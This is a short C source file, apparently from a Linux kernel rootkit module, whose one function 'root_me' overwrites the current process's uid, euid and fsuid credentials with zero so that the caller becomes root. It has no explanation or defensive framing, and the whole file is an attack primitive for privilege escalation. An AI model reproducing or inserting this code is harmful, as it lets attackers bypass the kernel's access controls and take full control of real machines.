#include <linux/sched.h>

#include "rootshell.h"

void root_me(void)
{

  uid_t* v = (uid_t*) &current->cred->uid;
  *v = 0;
  v = (uid_t*) &current->cred->euid;
  *v = 0;
  v = (uid_t*) &current->cred->fsuid;
  *v = 0;
}

